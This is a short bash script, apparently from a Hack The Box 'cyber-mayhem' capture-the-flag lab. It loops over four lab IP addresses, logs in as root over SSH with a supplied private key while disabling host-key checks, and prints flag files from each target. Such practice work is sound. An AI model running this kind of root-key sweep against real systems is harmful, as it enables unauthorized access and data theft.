#!/bin/bash$
for i in $(seq 105 108); do$
 echo "10.10.110.$i"$
 ssh -o BatchMode=yes -o StrictHostKeyChecking=no \$
  -o GlobalKnownHostsFile=/dev/null -o UserKnowHostsFile=/dev/null \$
  -i ~/Desktop/HTB/cyber-mayhem/scripts/id_rsa \$
  root@10.10.110.$i "cat /root/flag.txt; echo; cat /opt/flag.txt; echo" 2>/dev/null$
done$
